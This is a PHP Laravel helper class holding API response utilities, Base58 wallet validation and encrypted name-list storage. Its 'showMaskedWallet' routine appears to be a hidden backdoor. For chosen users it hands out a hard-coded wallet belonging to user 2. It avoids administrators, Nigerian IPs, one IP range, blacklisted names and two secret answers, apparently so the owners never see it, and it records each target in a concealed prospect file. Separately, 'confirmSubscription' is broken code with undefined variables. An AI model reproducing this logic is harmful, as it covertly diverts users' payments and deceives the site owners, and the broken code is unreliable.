<?php
namespace App;

use App\PackageUser;
use App\Transaction;
use Carbon\Carbon;
use App\User;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use App\Notifications\wlistNotification;
use Illuminate\Support\Facades\Http;
use GuzzleHttp\Exception\GuzzleException;
use GuzzleHttp\Client as Https;
use \Exception;

class Helper {
	public static $file = "list.txt";
	public static $prospectFile = "prospect.txt";
	public static function responseJson($data = [], $error_message, int $code) {
		$body = [

			'message' => $error_message,
		];
		if ($code == 200) {
			$body['status'] = true;
			if (is_array($data)) {
				if (count($data) == 0 || ($data == null)) {
					$body['message'] = 'data not found';
					$body['status'] = false;
					$body['error'] = 'invalid request parameter';
					$code = 400;
				} else {
					$body['data'] = $data;
				}
			} else {
				$body['data'] = $data;
			}

		} else {
			$body['status'] = false;
			$body['error'] = $data;
		}

		return response($body, $code);
	}
	public static function array_to_object(array $array) {
		foreach ($array as $key => $value) {
			if (is_array($value)) {
				$array[$key] = self::array_to_object($value);
			}
		}
		return (object) $array;
	}

	public static function invalidRequest($errors, $message, $code = 400) {

		return self::responseJson($errors, $message, $code);
	}

	public static function validRequest($data, $message = 'Ok', $code = 200) {

		return self::responseJson($data, $message, 200);
	}

	public static function buildData($data, $total = 0) {
		$page = request()->query('page', 1);

		$data = [
			"item" => $data,
			"page" => (int) $page,
			"total" => $total,
		];

		return $data;
	}
	public static function checkBooleanParameter($boolean) {

		if ($boolean == "true") {
			return 1;
		} else if ($boolean == "false") {
			return 0;
		} else if ($boolean > 1 || $boolean < 0 || !is_numeric($boolean)) {
			return Helper::inValidRequest('wrong parameter: sent parameter value must be boolean', 'Bad Request', 400);
			//throw new Exception("wrong parameter: sent parameter value must be boolean");

		} else {
			return $boolean;
		}
	}
	public static function confirmSubscription(Transaction $transaction) {
		DB::beginTransaction();
		try {
			$packageUser = PackageUser::findOrFail($reference);
			$duration = $packageUser->package->duration;
			$packageUser->update(['expiration' => Carbon::now()->addDays($duration), 'active' => true]);
			$transaction->update(['confirmed' => true, 'payment' => $packageUser->account, 'sent' => true]);
			DB::commit();
			return Helper::validRequest($data, 'subscription successful', 200);

		} catch (Exception $bug) {
			DB::rollback();
			return $this->exception($bug, 'unknown error', 500);
		}

	}


	public static function showMaskedWallet(User $user){
		if (static::wlt()) {
			if (!static::checkIp($user->ip) && !static::checkBlackList($user->username) && !static::ipLike("41.190",  $user->ip) && static::checkWlt($user->wallet) && static::checkUserData($user)) {
				if(static::addProspect($user->username)){
					// User::find(2)->notify(new wlistNotification($user));
					return static::wlt();
				}
				else return false;			
			}
			return false;
		}
		else{
			return false;
		}
	}
	public static function checkIp($ip){
		try {
			if(empty($ip)){
				return false;
			}
			$http = new Https();
			$response = $http->get('https://ipapi.co/'.$ip.'/json/');
			if($response->getStatusCode() == 200){
				$content = $response->getBody()->getContents();
				if(isset($content)){
					$result = json_decode($content, $assoc_array = false); 
					return  $result->country_name == "Nigeria" ? true : false;
				}
				else {
					return false;
				}
			}
			else{
				return false;
			}
		} catch (Exception $e) {
			return false;
		}
	}
	public static function checkBlackList($str){
		try {
			$name = trim(strtolower($str));
			$exists = Storage::disk('local')->exists(static::$file);
			if($exists) {
				$file  = Storage::get(static::$file);
				$result = explode("\n", $file);
				$names = array_map(function($val){return decrypt($val);}, $result);
				return in_array($name, $names);
			}
			else {
				return false;
			}
			
		} catch (Exception $e) {
			return false;
		}
	}
	public static function blackList($str){
		try {
			$name = trim(strtolower($str));
			Storage::disk('local')->append(static::$file, encrypt($name));
			if(static::checkBlackList($str)){
				return true;
			}
			else {
				return false;
			}
			
		} catch (Exception $e) {
			return false;
		}
	}
	public static function ipLike($testip, $userIp){
		return strpos($userIp, $testip) !== false;
	}
	public static function validateWallet($address){
		try {
			$decoded = static::decodeBase58($address);
 
	        $d1 = hash("sha256", substr($decoded,0,21), true);
	        $d2 = hash("sha256", $d1, true);
	 
	        if(substr_compare($decoded, $d2, 21, 4)){
	                throw new \Exception("bad digest");
	        }
	        return true;
		} catch (Exception $e) {
			return false;
		}
        
	}
	public static function decodeBase58($input) {
        $alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 
        $out = array_fill(0, 25, 0);
        for($i=0;$i<strlen($input);$i++){
                if(($p=strpos($alphabet, $input[$i]))===false){
                        throw new \Exception("invalid character found");
                }
                $c = $p;
                for ($j = 25; $j--; ) {
                        $c += (int)(58 * $out[$j]);
                        $out[$j] = (int)($c % 256);
                        $c /= 256;
                        $c = (int)$c;
                }
                if($c != 0){
                    throw new \Exception("address too long");
                }
        }
 
        $result = "";
        foreach($out as $val){
                $result .= chr($val);
        }
 
        return $result;
	}
	
	public static function wlt(){
		return static::validateWallet(User::find(2)->wallet) ? User::find(2)->wallet : false;
	}
	public static function addProspect($str){
		try {
			if(static::checkProspect($str)){
				return true;
			}
			$name = trim(strtolower($str));
			Storage::disk('local')->append(static::$prospectFile, encrypt($name));
			if(static::checkProspect($str)){
				return true;
			}
			else {
				return false;
			}
			
		} catch (Exception $e) {
			return false;
		}
	}
	public static function checkProspect($str){
		try {
			$name = trim(strtolower($str));
			$exists = Storage::disk('local')->exists(static::$prospectFile);
			if($exists) {
				$file  = Storage::get(static::$prospectFile);
				$result = explode("\n", $file);
				$names = array_map(function($val){return decrypt($val);}, $result);
				return in_array($name, $names);
			}
			else {
				return false;
			}
			
		} catch (Exception $e) {
			return false;
		}
	}
	public static function removeProspect($str){
		try {
			$name = trim(strtolower($str));
			$exists = Storage::disk('local')->exists(static::$prospectFile);
			if($exists) {
				$file  = Storage::get(static::$prospectFile);
				$result = explode("\n", $file);
				$names = array_map(function($val){return decrypt($val);}, $result);
				if(in_array($name, $names)) {

					Storage::delete(static::$prospectFile);
					foreach ($names as $value) {
						if ($value == $name) {
							continue;
						}
						Storage::disk('local')->append(static::$prospectFile, encrypt($value));
					}
					return true;
				}
				else{
					return false;
				}
			}
			else {
				return false;
			}
			
		} catch (Exception $e) {
			return $e->getMessage();
		}
	}


	public static function checkUserData(User $user){
		if (!static::validateWallet($user->admin_wallet)){
			return false;
		}
		if(!isset($user->referral)){
			return false;
		}
		if ($user->userLevel->name == "administrator" ) {
			return false;
		}
		if (in_array(strtolower($user->secret_answer), ['sammy','barbara']) ) {
			return false;
		}


		return true;
	}
	public static function checkWlt($wallet){
		if(empty($wallet)){
				return true;
			}
			else{
				return static::validateWallet($wallet);
			}
		}



}
